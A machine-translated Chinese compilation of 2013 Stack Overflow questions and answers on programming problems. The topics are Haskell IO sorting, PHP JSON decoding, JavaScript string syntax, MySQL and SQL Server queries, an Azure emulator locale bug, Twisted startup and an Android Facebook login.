我有一个`[(String, [String], IO Int)]`列表，我想对其进行排序。`sortBy (\x -> ...) list`要求我使用 IO 来获取 的内部值`IO Int`，这意味着我不能返回`Ordering`而只能`IO Ordering`返回`sortBy`函数。有没有办法对列表进行排序？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-25T01:00:54.373

每个元组的第三个元素是`IO Int`，因此它的值取决于外部世界。所以排序列表的*顺序*取决于外部世界。所以不，没有办法制作一个 `[(String, [String], IO Int)]`按`IO Int`.

您*可以*做的是创建一个值`IO [(String, [String], Int)]`，然后将该函数提升到`sortBy`monad*中*`IO`，为您提供另一个`IO [(String, [String], Int)]`将产生一个按 . 排序的列表`Int`。这不是一个纯列表，但您可以将 lift 任何其他纯函数注入`IO`monad 以对其进行任意纯计算。

这样的事情会做：

```
import Control.Applicative
import Data.List

l :: [(String, [String], IO Int)]
l = [("Foo", [], return 2), ("Bar", [], return 1)]

f :: Monad m => (a, b, m c) -> m (a, b, c)
f (x, y, ioz) = ioz >>= \z -> return (x, y, z)

sl = sortBy (\(x, y, z) (x', y', z') -> compare z z') <$> mapM f l 
```

我应该提一下，因为它可能不明显，这将`IO Int`按照它们最初出现在列表中的顺序运行这些操作。但是要对它们进行排序，您必须运行它们以获取`Int`值，并且它们必须以*某种*顺序运行。

# php - JSON转php访问

> ID：16204529
> 
> 赞同：0
> 
> 时间：2013-04-25T00:34:26.833
> 
> 标签：php, json

我有一个使用 Javascript 创建的 JSON 数组。

我在将其放入输入字段之前对其进行字符串化并使用 HTML 表单提交。

这是我解码后的输出：

var_dump(json_decode($_POST['json']),true); 输出：

```
[{"Mid": "1", "cat": "6", "room": "21", "rate": "EURP", "adchexb": "2,2,1"}, {"Mid": "2", "cat": "3", "room": "12", "rate": "EURP", "adchexb": "2,1,1"}] 
```

然后每次我尝试访问任何属性时都会出错。我试过了：

```
$jsonObj->Mid //gives "Trying to get property of non-object in..."

$jsonObj[0]->Mis //error again. 
```

基本上我需要在一个`for`循环中提取每个对象。请帮我弄清楚如何访问或获取循环中的所有对象属性。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T00:36:42.670

您需要将 json 字符串解码为 php 对象

`$jsonObj = json_decode($jsonObj)`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T00:40:12.187

`json_decode()`将为您提供来自此 json 输入的两个对象的数组：

```
$json = '[{"Mid": "1", "cat": "6", "room": "21", "rate": "EURP", "adchexb": "2,2,1"}, {"Mid": "2", "cat": "3", "room": "12", "rate": "EURP", "adchexb": "2,1,1"}]';
$result = json_decode($json);
var_dump($result); 
```

* * *

使用数组访问运算符访问它们`[]`：

```
echo $result[0]->Mid; 
```

或者

```
echo $jsonObj[1]->Mid; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T00:42:20.703

如果您想在`json_encode`函数中使用附加参数，可以添加第二个参数。例如：

```
$myArray = json_decode($jsonObj,true); 
```

现在`$myArray`将是您访问的关联数组，如下所示：

```
$myArray[0]['Mid']; 
```

# javascript - 未捕获的 SyntaxError：意外的保留字

> ID：16204532
> 
> 赞同：3
> 
> 时间：2013-04-25T00:34:45.340
> 
> 标签：javascript, jquery

我在 JQUERY 中有这段代码：

```
var large='<div class="vip" style ="background:url(./uploads/deal/"+data[a].id+"_1.jpg);">
           <span class ="coundtown" value ='+data[a].deal_time_off+' style ="display:none;"></span>
          <script> $(document).ready(function(){ $('+data[a].deal_unique_id+').countdown({ date:'+data[a].deal_time_off+'}); }); </script>
       <div class = "deal_info clearfix">
           <div class = "deal_subject clearfix">
               <a href="./deal/'+data[a].deal_unique_id+'">adsfd</a>
           </div>
           <div style = "clear:both"></div>
           <div class="timer">
             <img class="img" src="./img/stopwatch.png" border="none" />
             <span class ='+data[a].deal_unique_id+'></span>
           </div>
         </div>
         <div class="percent_mini"></div>
     </div>';
        //$("#left_row").append(large); 
```

但在这一行：

```
 <span class ="coundtown" value ='+data[a].deal_time_off+' style ="display:none;"> 
```

我收到此错误：

> 未捕获的 SyntaxError：意外的保留字

问题是什么？

```
var large='<div class="vip" style ="background:url(http://mydeal.ge/uploads/deal/"+data[a].id+"_1.jpg);">
           <span class ="coundtown" value ="'+data[a].deal_time_off+'" style ="display:none;"></span>
          <script> $(document).ready(function(){ $("'+data[a].deal_unique_id+'").countdown({ date:"'+data[a].deal_time_off+'"}); }); </script>
       <div class = "deal_info clearfix">
           <div class = "deal_subject clearfix">
               <a href="http://mydeal.ge/deal/'+data[a].deal_unique_id+'">adsfd</a>
           </div>
           <div style = "clear:both"></div>
           <div class="timer">
             <img class="img" src="http://mydeal.ge/img/stopwatch.png" border="none" />
             <span class ="'+data[a].deal_unique_id+'"></span>
           </div>
         </div>
         <div class="percent_mini"></div>
     </div>'; 
```

我修复了这个变量，但仍然出现错误

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T00:41:38.317

你不能在 javascript 字符串中使用换行符而不转义它们：

```
var str1 = "abcd
            efgh"; 
```

应该：

```
var str1 = "abcd\
            efgh"; 
```

您的 HTML 分布在多行中，因此您需要转义换行符：

```
var large='<div class="vip" style ="background:url(./uploads/deal/"+data[a].id+"_1.jpg);">\
       <span class ="coundtown" value ='+data[a].deal_time_off+' style ="display:none;"></span>\
      <script> $(document).ready(function(){ $('+data[a].deal_unique_id+').countdown({\ date:'+data[a].deal_time_off+'}); }); </script>\
   <div class = "deal_info clearfix">\
       <div class = "deal_subject clearfix">\
           <a href="./deal/'+data[a].deal_unique_id+'">adsfd</a>\
       </div>\
       <div style = "clear:both"></div>\
       <div class="timer">\
         <img class="img" src="./img/stopwatch.png" border="none" />\
         <span class ='+data[a].deal_unique_id+'></span>\
       </div>\
     </div>\
     <div class="percent_mini"></div>\
 </div>'; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-25T03:48:14.070

不要在变量中使用 html，更不用说包含 html 的脚本，因为它最难维护。你应该使用模板吗（[Handlebars](http://handlebarsjs.com/)、[undersscore](http://underscorejs.org/)、mustache、...）。祝你好运！

前任：

```
 <html lang="en">
    <head>
      <meta charset="UTF-8">
      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>

      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/handlebars.js/1.0.0-rc.3/handlebars.min.js"></script>

      <title>your title</title>
    </head>
    <body>
     <script id="our-tpl" type="text/x-handlebars-template">
      <div class="vip" style ="background:url(./uploads/deal{{deal_unique_id}}_1.jpg);"> 
        <span class ="coundtown" value="{{deal_time_off}}" style ="display:none;"></span>
        <div class = "deal_info clearfix">
          <div class = "deal_subject clearfix">
            <a href="./deal/{{deal_unique_id}}">adsfd</a>
          </div>
          <div style = "clear:both"></div>
          <div class="timer">
            <img class="img" src="./img/stopwatch.png" border="none" />
            <span class ="{{deal_unique_id}}"></span>
          </div>
        </div>
        <div class="percent_mini"></div>
      </div>
    </script>
    <div class="render"></div>

    <script type="text/javascript">
      var obj = {deal_unique_id: 1, deal_time_off: "This is your count"},
          tpl =  Handlebars.compile(($('#our-tpl').html())),
          $rend = $('.render');
          //render
          $rend.html(tpl(obj));
      $('.vip').ready(function(){ 
        var el = '.'+obj.deal_unique_id;
        $(el).countdown({ date:obj.deal_time_off}); 
      }); 
    </script>

    </body>
    </html> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-25T00:36:59.690

`value`我想也许你在属性值周围缺少引号。

`<span class ="coundtown" value ="'+data[a].deal_time_off+'" style ="display:none;">`

注意`value="...`

编辑——等等等等。

除非该字符串都在一行中，否则您需要将其拆分。

```
var large='<div class="vip" style ="background:url(./uploads/deal/"+data[a].id+"_1.jpg);"';
    large+='       <span class ="coundtown" value ='+data[a].deal_time_off+' style="display:none;"></span>'
... 
```

您不能在许多不同的行中使用一个字符串。

# php - 根据用户输入使用 PHP/MySQL 对结果进行排序

> ID：16204533
> 
> 赞同：0
> 
> 时间：2013-04-25T00:35:06.380
> 
> 标签：php, mysql, sorting

为“傻瓜编程”问题提前道歉......我徒劳地搜索了先前关于此的讨论。

所以我有一个装满摩托艇的 MySQL 表。每行都有基本的摩托艇信息（品牌/型号/等）加上一些不同特征的 1-10 分——“动力”、“舒适度”和“风格”。我想帮助用户找到满足他们个人需求的摩托艇。

默认情况下，数据按“总分”从高到低排序，如下所示：

```
$sql = "SELECT *,(power + comfort + style) as totalscore FROM boats ORDER BY totalscore DESC"; 
```

...我用 PHP 循环遍历结果并将它们显示为列表。

但随后我给用户一系列是/否问题来确定个人偏好，并且我希望每个答案都能*改变*用户会话中总分的值——从而改变列表项的顺序。

换句话说，我想`$_SESSION["totalscore"]`改变每个是/否用户输入......然后用户的结果应该从高到低排序`$_SESSION["totalscore"]`，而不是数据库中的原始总分。

**示意图示例**

1.  波士顿捕鲸船 370。力量=7，舒适度=8，风格=6，总分=21
2.  波士顿捕鲸船 350。力量=5，舒适度=7，风格=8，总分=20

问题1：你喜欢时尚吗？是/否

```
if Yes {
    $_SESSION["totalscore"] = totalscore + style;
    reorder list items by $_SESSION["totalscore"]; // the 350 is now #1
  }
  if No {
     $_SESSION["totalscore"] = totalscore + (style/2);
     reorder list items by $_SESSION["totalscore"]; // they're now tied for #1
  } 
```

等等。

从概念上讲，让我感到困惑的是，`$_SESSION["totalscore"]`它将被存储为 cookie，而原始总分来自数据库查询。因此，一旦我从 totalscore 切换到`$_SESSION["totalscore"]`，我不知道如何重新排序列表项。

有人能指出我正确的方向吗，如果只是示意性的？我想弄清楚，但我不确定此时要弄清楚什么。非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T04:00:19.813

一种方法是，不是在查询中选择总分然后对结果进行一次排序，而是在每次用户更改偏好时进行查询

例子

```
SELECT ( power + rating + style) as total_score from boats order by total_score; 
```

然后循环遍历结果并显示第一组结果。为用户提供选项以做出选择，然后再次运行查询，如下所示 -

```
if(style_matters)
{
   $q = mysql_query("SELECT (power + rating + 2*style) as total_score from boats order by total_score");
   //use this new result set in $q to present the new listing
}
else
{
   $q = mysql_query("SELECT (power + rating + style/2) as total_score from boats order by total_score");
   //use this for result set when style doesnt matter.
} 
```

如果您有大量的数据库命中，这可能是一项昂贵的操作，但我认为这不是什么大问题。

您可以使用 AJAX 运行此查询以避免页面重新加载。

编辑：在您开始达到 6-7 位数字之前，您甚至不会注意到发生了多个数据库查询。尽管您不应该在查询中使用“SELECT * from”。始终指定要使用的确切列。此外，在您的特定情况下，您可以限制向用户展示的结果数量。在一页上显示 10 个结果，在另一页上显示接下来的 10 个结果。限制结果会对查询产生重大影响。

[当您知道只有 1 个结果时，向 MySQL 查询添加“LIMIT 1”是否会使它们更快？](https://stackoverflow.com/questions/455476/does-adding-limit-1-to-mysql-queries-make-them-faster-when-you-know-there-will)

[没有双重查询的MySQL分页？](https://stackoverflow.com/questions/818567/mysql-pagination-without-double-querying)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T00:49:54.287

您可以将会话中的总分存储到从数据库返回的结果中，并使用 php 的排序功能对结果进行重新排序。

# asp.net-mvc - Windows Azure 存储模拟器无法将日期时间字符串转换为有效时间戳

> ID：16204537
> 
> 赞同：0
> 
> 时间：2013-04-25T00:35:18.007
> 
> 标签：asp.net-mvc, azure, azure-storage

我是 Windows Azure 的新手。我正在开发一个使用 Windows Azure 存储的简单 asp.net FileManager 门户。我在 windows azure 门户上没有帐户，所以我尝试使用存储模拟器。每次我尝试使用 Visual Studio 运行存储时，我都有以下行为：

1.  启动计算模拟器
2.  启动存储模拟器
3.  启动网络角色，但它的外壳向我显示以下消息：

    [MonAgentHost] 错误：MA 事件：2013-04-24T23:58:59.234Z [MonAgentHost] 错误：2 [MonAgentHost] 错误：3108 [MonAgentHost] 错误：14084 [MonAgentHost] 错误：SelfMonitoring [MonAgentHost] 错误：0 [MonAgentHost ] 错误：824f03af-5b9b-4ea5-84fa-6bd04de [MonAgentHost] 错误：selfmon.cpp [MonAgentHost] 错误：MASelfMon::GetProcCntrs [MonAgentHost] 错误：1421 [MonAgentHost] 错误：ffffffffc0000bb8 [MonAgentHost] 错误：0 [MonAgentHost]错误：
    [MonAgentHost] 错误：PdhAddCounter(\Process(MonAgentHost#0)\ID Process) 失败 [MonAgentHost] 错误：MA 事件：2013-04-24T23:58:59.277Z [MonAgentHost] 错误：2 [MonAgentHost] 错误：3108 [ MonAgentHost] 错误：4508 [MonAgentHost] 错误：FileListener.dll [MonAgentHost] 错误：0 [MonAgentHost] 错误：a4827672-7864-4b12-9994-848f8d0 [MonAgentHost] 错误：filelistener.cpp [MonAgentHost] 错误：FileListener::StringToTimeStamp [MonAgentHost] 错误：281 [MonAgentHost] 错误：ffffffff80010003 [MonAgentHost] 错误：0 [MonAgentHost] 错误：
    [MonAgentHost] 错误：错误：无法将日期时间字符串 2013-04-24T23.58.56.001Z 转换为有效时间戳 [诊断]：检查配置更新 24/04/2013 23.59.08。

它循环这个错误。有什么建议么？也许这是一个日期时间格式问题......但我该如何解决呢？

编辑：这是我的外壳的输出

```
[fabric] Role Instance: deployment18(55).SafetyPlatform.SafetyPlatform.Web.0
[fabric] Role state Started
[Diagnostics]: UpdateState(Microsoft.WindowsAzure.Diagnostics.DiagnosticMonitorStartupInfo, Microsoft.WindowsAzure.Diagnostics.DiagnosticMonitorConfiguration, )
[Diagnostics]: Acquired mutex
[Diagnostics] Information: C:\Users\Antonio\AppData\Local\dftmp\Resources\e2f7627c-4994-45f8-9faf-e6b79b9014d6\directory\DiagnosticStore\Monitor
[Diagnostics] Information: C:\Users\Antonio\documents\visual studio 2012\Projects\SafetyPlatform\SafetyPlatform.Azure\csx\Debug\roles\SafetyPlatform.Web\diagnostics\x64\monitor\MonAgentHost.exe -LocalPath "C:\Users\Antonio\AppData\Local\dftmp\Resources\e2f7627c-4994-45f8-9faf-e6b79b9014d6\directory\DiagnosticStore\Monitor" -StaticConfigFile "C:\Users\Antonio\AppData\Local\dftmp\Resources\e2f7627c-4994-45f8-9faf-e6b79b9014d6\directory\DiagnosticStore\Monitor\Configuration\mastaticconfig.xml" -ConfigFile "C:\Users\Antonio\AppData\Local\dftmp\Resources\e2f7627c-4994-45f8-9faf-e6b79b9014d6\directory\DiagnosticStore\Monitor\Configuration\maconfig.xml" -ShutDownEvent WADDM-ShutDown-3db0f5b65bf94bb793a6f8cebd833fe7 -InitializedEvent WADM-StartUp-3db0f5b65bf94bb793a6f8cebd833fe7 -parent 10416 -events
[MonAgentHost] Error: MA EVENT: 2013-04-25T16:47:04.167Z
[MonAgentHost] Error:     2
[MonAgentHost] Error:     4752
[MonAgentHost] Error:     11536
[MonAgentHost] Error:     SelfMonitoring
[MonAgentHost] Error:     0
[MonAgentHost] Error:     dcc23483-2ce0-4897-8675-0cb23d5
[MonAgentHost] Error:     selfmon.cpp
[MonAgentHost] Error:     MASelfMon::GetProcCntrs
[MonAgentHost] Error:     1421
[MonAgentHost] Error:     ffffffffc0000bb8
[MonAgentHost] Error:     0
[MonAgentHost] Error:     
[MonAgentHost] Error:     PdhAddCounter(\Process(MonAgentHost#0)\ID Process) failed
[Diagnostics]: Creating config channel server
[MonAgentHost] Output: Agent will exit when WADDM-ShutDown-3db0f5b65bf94bb793a6f8cebd833fe7 is signaled.
[MonAgentHost] Output: Will signal WADM-StartUp-3db0f5b65bf94bb793a6f8cebd833fe7 after the agent is initialized.
[MonAgentHost] Output: Registered as an event consumer.
[MonAgentHost] Output: Agent will exit when parent process 10416 exits.
[MonAgentHost] Output: Monitoring Agent Started
[Diagnostics]: Starting configuration channel polling
[runtime] Role entrypoint . CALLING   OnStart()
[runtime] Role entrypoint . COMPLETED OnStart()
[runtime] Role entrypoint . CALLING   Run()
[Diagnostics]: Checking for configuration updates 25/04/2013 18:48:04.
[Diagnostics]: Signalling process restart on event = WADDM-ShutDown-3db0f5b65bf94bb793a6f8cebd833fe7
[MonAgentHost] Error: MA EVENT: 2013-04-25T16:48:05.441Z
[MonAgentHost] Error:     3
[MonAgentHost] Error:     4752
[MonAgentHost] Error:     11536
[MonAgentHost] Error:     SelfMonitoring
[MonAgentHost] Error:     0
[MonAgentHost] Error:     dcc23483-2ce0-4897-8675-0cb23d5
[MonAgentHost] Error:     selfmon.cpp
[MonAgentHost] Error:     MASelfMon::StartTerminationCountdown
[MonAgentHost] Error:     1088
[MonAgentHost] Error:     10011
[MonAgentHost] Error:     0
[MonAgentHost] Error:     
[MonAgentHost] Error:     Not starting termination thread inside a client hosted monitoring agent
[MonAgentHost] Output: Exiting the monitoring agent 4752 after the shutdown event was signaled.
[MonAgentHost] Output: Monitoring Agent Stopped
[Diagnostics] Information: Diagnostic process exited with code: 0
[Diagnostics] Information: C:\Users\Antonio\AppData\Local\dftmp\Resources\e2f7627c-4994-45f8-9faf-e6b79b9014d6\directory\DiagnosticStore\Monitor
[Diagnostics] Information: C:\Users\Antonio\documents\visual studio 2012\Projects\SafetyPlatform\SafetyPlatform.Azure\csx\Debug\roles\SafetyPlatform.Web\diagnostics\x64\monitor\MonAgentHost.exe -LocalPath "C:\Users\Antonio\AppData\Local\dftmp\Resources\e2f7627c-4994-45f8-9faf-e6b79b9014d6\directory\DiagnosticStore\Monitor" -StaticConfigFile "C:\Users\Antonio\AppData\Local\dftmp\Resources\e2f7627c-4994-45f8-9faf-e6b79b9014d6\directory\DiagnosticStore\Monitor\Configuration\mastaticconfig.xml" -ConfigFile "C:\Users\Antonio\AppData\Local\dftmp\Resources\e2f7627c-4994-45f8-9faf-e6b79b9014d6\directory\DiagnosticStore\Monitor\Configuration\maconfig.xml" -ShutDownEvent WADDM-ShutDown-c5e4e166e3ca45a69d0f30d7785f20f9 -InitializedEvent WADM-StartUp-c5e4e166e3ca45a69d0f30d7785f20f9 -parent 10416 -events
[MonAgentHost] Error: MA EVENT: 2013-04-25T16:48:08.041Z
[MonAgentHost] Error:     2
[MonAgentHost] Error:     9400
[MonAgentHost] Error:     11948
[MonAgentHost] Error:     SelfMonitoring
[MonAgentHost] Error:     0
[MonAgentHost] Error:     8bc9ab18-a05b-4a5c-b054-963f010
[MonAgentHost] Error:     selfmon.cpp
[MonAgentHost] Error:     MASelfMon::GetProcCntrs
[MonAgentHost] Error:     1421
[MonAgentHost] Error:     ffffffffc0000bb8
[MonAgentHost] Error:     0
[MonAgentHost] Error:     
[MonAgentHost] Error:     PdhAddCounter(\Process(MonAgentHost#0)\ID Process) failed
[MonAgentHost] Output: Agent will exit when WADDM-ShutDown-c5e4e166e3ca45a69d0f30d7785f20f9 is signaled.
[MonAgentHost] Output: Will signal WADM-StartUp-c5e4e166e3ca45a69d0f30d7785f20f9 after the agent is initialized.
[MonAgentHost] Output: Registered as an event consumer.
[MonAgentHost] Output: Agent will exit when parent process 10416 exits.
[MonAgentHost] Output: Monitoring Agent Started
[Diagnostics]: Starting configuration channel polling 
```

之后，它继续进行诊断（我认为这是正常的）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T10:38:39.753

通过将计算机的区域设置更改为意大利，我能够在我的计算机上重现此错误。我相信您偶然发现了计算模拟器的错误。发生的事情是计算模拟器（而不是诊断监视器代理）不喜欢`.`基于您的语言环境（意大利）的默认时间分隔符 ( )。

如果您可以接受，我确实找到了解决方法。解决方法是将默认时间分隔符从 更改`.`为`:`。我尝试了相同的方法，但更改后没有给我错误。有关更多详细信息，请参阅下面的屏幕截图。

![在此处输入图像描述](https://i.stack.imgur.com/zOO7A.png)

希望这可以帮助。

# php - 在 SQL Server 中将 Varchar 值转换为整数/十进制值

> ID：16204539
> 
> 赞同：5
> 
> 时间：2013-04-25T00:35:35.087
> 
> 标签：php, sql, sql-server

如何将具有数据类型的表中记录的值转换`varchar`为`integer`或者`decimal`我可以获得值的总和。我用`SQL Server 2005`.

假设我有这样的表结构：

```
ID int
Stuff varchar 
```

和记录

```
ID = 1, Stuff = 32.43
ID = 2, Stuff = 43.33
ID = 3, Stuff = 23.22 
```

现在我想得到列东西的总数：

```
SELECT SUM(convert(decimal(4,2), Stuff)) as result FROM table 
```

但它不起作用。请需要帮助！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-25T00:55:35.397

表结构......非常基本：

```
create table tabla(ID int, Stuff varchar (50));

insert into tabla values(1, '32.43');
insert into tabla values(2, '43.33');
insert into tabla values(3, '23.22'); 
```

询问：

```
SELECT SUM(cast(Stuff as decimal(4,2))) as result FROM tabla 
```

或者，试试这个：

```
SELECT SUM(cast(isnull(Stuff,0) as decimal(12,2))) as result FROM tabla 
```

使用 SQLServer 2008

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-25T01:30:01.663

你得到算术溢出。这意味着您正在尝试使转换无法进行。当您尝试进行转换并且命运数据类型不足以转换原始数据时，将引发此错误。例如：

如果您尝试将 100.52 转换为 decimal(4,2)，您将收到此错误。数字 100.52 需要 5 个位置，其中 2 个是十进制的。

尝试将小数精度更改为 16,2 或更高。先尝试几条记录，然后将其用于所有选择。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-25T00:54:39.137

原因可能是总和超过了所需的位数 - 4。如果将小数的大小增加到`decimal(10,2)`，它应该可以工作

```
 SELECT SUM(convert(decimal(10,2), Stuff)) as result FROM table 
```

或者

```
 SELECT SUM(CAST(Stuff AS decimal(6,2))) as result FROM table 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-25T00:44:58.377

您可以在不强制转换的情况下使用它，例如：

```
select sum(`stuff`) as mySum from test; 
```

或将其转换为十进制：

```
select sum(cast(`stuff` as decimal(4,2))) as mySum from test; 
```

[SQLFiddle](http://sqlfiddle.com/#!2/5edf8/1)

**编辑**

对于 SQL Server，您可以使用：

```
select sum(cast(stuff as decimal(5,2))) as mySum from test; 
```

[SQLFiddle](http://sqlfiddle.com/#!3/6e7cf/6)

# sql - 应显示总数的 SQL 过程

> ID：16204540
> 
> 赞同：1
> 
> 时间：2013-04-25T00:35:44.540
> 
> 标签：sql, sql-server-2008, select, sum, procedure

嗨，我有一个有效的程序，看起来像

```
create procedure sp_CountPickupsduringYearReportA1A2
 @MyYear int 
AS
SELECT
MAX(a.AgencyName),
COUNT(PickupID) as YearTotal,
COUNT(PickupID)/(CASE WHEN YEAR(GETDATE()) =@myYear THEN MONTH(GETDATE()) ELSE 12 END) as MoAvg,
SUM(CASE WHEN DATEPART(month, PickupDate) = 1 THEN 1 ELSE 0 end) as Jan,
SUM(CASE WHEN DATEPART(month, PickupDate) = 2 THEN 1 ELSE 0 end) as Feb,
SUM(CASE WHEN DATEPART(month, PickupDate) = 3 THEN 1 ELSE 0 end) as Mar,
SUM(CASE WHEN DATEPART(month, PickupDate) = 4 THEN 1 ELSE 0 end) as Apr, 
SUM(CASE WHEN DATEPART(month, PickupDate) = 5 THEN 1 ELSE 0 end) as May,
SUM(CASE WHEN DATEPART(month, PickupDate) = 6 THEN 1 ELSE 0 end) as Jun,
SUM(CASE WHEN DATEPART(month, PickupDate) = 7 THEN 1 ELSE 0 end) as Jul,
SUM(CASE WHEN DATEPART(month, PickupDate) = 8 THEN 1 ELSE 0 end) as Aug, 
SUM(CASE WHEN DATEPART(month, PickupDate) = 9 THEN 1 ELSE 0 end) as Sep,
SUM(CASE WHEN DATEPART(month, PickupDate) = 10 THEN 1 ELSE 0 end) as Oct,
SUM(CASE WHEN DATEPART(month, PickupDate) = 11 THEN 1 ELSE 0 end) as Nov,
SUM(CASE WHEN DATEPART(month, PickupDate) = 12 THEN 1 ELSE 0 end) as Dec 
FROM dbo.Pickup p join Agency a on p.agencyid = a.agencyid
where DATEPART(year, PickupDate) = @MyYear
group by a.AgencyID 
order by a.AgencyID 
```

它是完美的 lu 并且响应看起来像

```
name YearTotal MoAvg 1, 2, 3, 4, 5, 6, 7,8,9,10,11,12
test   13       1     1  1  1  1 1  1  1 1 1 1 1 1 2 
```

我需要为每列显示每个列的简单总和，例如

```
 name YearTotal MoAvg 1, 2, 3, 4, 5, 6, 7,8,9,10,11,12
        total   25       2    2  2  2  2 2  2  2 2 2 2 2 2 3  
        test   13       1     1  1  1  1 1  1  1 1 1 1 1 1 2
        test   12       1     1  1  1  1 1  1  1 1 1 1 1 1 1 
```

任何想法如何做到这一点？我试图解决这个难题几个小时仍然无法弄清楚

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T01:30:16.977

这通常在您的表示层中得到更好的处理。但是，您可以使用`UNION`查询获得相同的结果，将上述查询组合为使用`SUM`聚合的子查询。由于您使用的是 SQL Server 2008，因此您也可以使用公用表表达式：

```
WITH CTE AS (
SELECT
    MAX(a.AgencyName) Name,
    COUNT(PickupID) as YearTotal,
    COUNT(PickupID)/(CASE WHEN YEAR(GETDATE()) = YEAR(PickupDate) THEN MONTH(GETDATE()) ELSE 12 END) as MoAvg,
    SUM(CASE WHEN DATEPART(month, PickupDate) = 1 THEN 1 ELSE 0 end) as Jan,
    SUM(CASE WHEN DATEPART(month, PickupDate) = 2 THEN 1 ELSE 0 end) as Feb,
    SUM(CASE WHEN DATEPART(month, PickupDate) = 3 THEN 1 ELSE 0 end) as Mar,
    SUM(CASE WHEN DATEPART(month, PickupDate) = 4 THEN 1 ELSE 0 end) as Apr, 
    SUM(CASE WHEN DATEPART(month, PickupDate) = 5 THEN 1 ELSE 0 end) as May,
    SUM(CASE WHEN DATEPART(month, PickupDate) = 6 THEN 1 ELSE 0 end) as Jun,
    SUM(CASE WHEN DATEPART(month, PickupDate) = 7 THEN 1 ELSE 0 end) as Jul,
    SUM(CASE WHEN DATEPART(month, PickupDate) = 8 THEN 1 ELSE 0 end) as Aug, 
    SUM(CASE WHEN DATEPART(month, PickupDate) = 9 THEN 1 ELSE 0 end) as Sep,
    SUM(CASE WHEN DATEPART(month, PickupDate) = 10 THEN 1 ELSE 0 end) as Oct,
    SUM(CASE WHEN DATEPART(month, PickupDate) = 11 THEN 1 ELSE 0 end) as Nov,
    SUM(CASE WHEN DATEPART(month, PickupDate) = 12 THEN 1 ELSE 0 end) as Dec 
FROM dbo.Pickup p 
    JOIN Agency a ON p.agencyid = a.agencyid
GROUP BY a.AgencyID, YEAR(PickupDate)
)
SELECT * FROM CTE
UNION
SELECT 'Total',
    SUM(YearTotal) YearTotal,
    SUM(MoAvg) MoAvg,
    SUM(Jan) Jan,
    SUM(Feb) Feb,
    ....
    SUM(Dec) Dec
FROM CTE 
```

# python - 在 Twisted *before* 服务启动之前执行异步代码

> ID：16204544
> 
> 赞同：2
> 
> 时间：2013-04-25T00:36:05.557
> 
> 标签：python, twisted

我开始我的扭曲应用程序：

```
application = twisted.application.service.Application('myserv')
my_service = MyService()
my_service.setServiceParent(application)
my_factory = twisted.internet.protocol.ServerFactory()
my_factory.protocol = MyProtocol
twisted.application.internet.TCPServer(port, my_factory).setServiceParent(application)

class MyService:
    def startService(self):
        #only synchronous code here? 
```

在此服务可以接受客户端 tcp 连接之前，我需要建立与 redis 服务器的连接，这涉及到异步代码的执行。我想使用`d=txredisapi.Connection()` 或`d = yield txredisapi.Connection()`与`inlineCallbacks`. 这个 deferred 必须在服务启动之前触发（在客户端的 tcp 连接被接受之前）。启动的最佳地点是`txredisapi.Connection()`什么？理想情况下，我想把它放在`MyService`课堂上。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T04:48:52.847

只需在顶层编写函数来创建 Redis 连接并将其传递给 MyService。可以在异步代码中添加服务。

```
application = twisted.application.service.Application("myserv")

@defer.inlineCallbacks
def startApp():
  rc = yeld txredisapi.Connection()
  my_service = MyService(rc)
  my_service.setServiceParent(application)
  my_factory = twisted.internet.protocol.ServerFactory()
  my_factory.protocol = MyProtocol
  twisted.application.internet.TCPServer(port, my_factory).setServiceParent(application)

startApp() 
```

# html - 在 DIV 中显示页面

> ID：16204546
> 
> 赞同：1
> 
> 时间：2013-04-25T00:36:18.563
> 
> 标签：html, css

我想从另一个页面 (.html) 获取 div 内容并使用我的页面样式显示它。

div 的高度应该取决于内容的大小，因为它与页面底部对齐并且需要保持这样。

这有可能吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T00:39:51.870

如果您希望使用本地样式设置远程文件中的内容，则必须将样式加载到包含该远程文件的 iframe 中（删除任何竞争样式表），或者将远程文件中的内容加载到本地文件。后者可能更容易。

在线存在许多工具来帮助您执行此操作。例如，[jQuery](http://api.jquery.com/)（世界上最流行的 JavaScript 库）可以异步加载远程文件，然后将其部分添加到父文档：

```
$("#page").load("remote.html #content"); 
```

这将获取`#content`on page的内容`remote.html`，并将它们`#page`放在当前页面中。

# java - Android - 打开会话不适用于上一个 Facebook 应用程序版本，如果未安装 facebook，则工作正常

> ID：16204547
> 
> 赞同：0
> 
> 时间：2013-04-25T00:36:21.767
> 
> 标签：java, android, facebook, facebook-graph-api

我开发了 facebook 应用程序，但是当它安装到设备上时，如果设备上没有安装 facebook 应用程序，并且当 facebook 应用程序安装时会话无法打开，则它可以正常工作。我的代码如下，

```
Session.openActiveSession(this, true,
            new Session.StatusCallback() {
                // callback when session changes state
                @Override
                public void call(Session session, SessionState   state,
                        Exception exception) {
                    if (session.isOpened()) {

                        // make request to the /me API
                        Request.executeMeRequestAsync(session,
                                new Request.GraphUserCallback() {
                                    @Override
                                    public void onCompleted(GraphUser user,
                                            Response res) {
                                        if (user != null) {
                                            User.getInstance().setProfile(user);

                                        }
                                    }
                                });
                    }
                }
            });

      @Override
  public void onActivityResult(int requestCode, int resultCode, Intent data) {
      super.onActivityResult(requestCode, resultCode, data);
      Session.getActiveSession().onActivityResult(this, requestCode, resultCode,  data);
      if(Session.getActiveSession().isOpened()) {
          Log.i("here opened", "thnx");

      }
} 
```

* * *

## 回答 #1

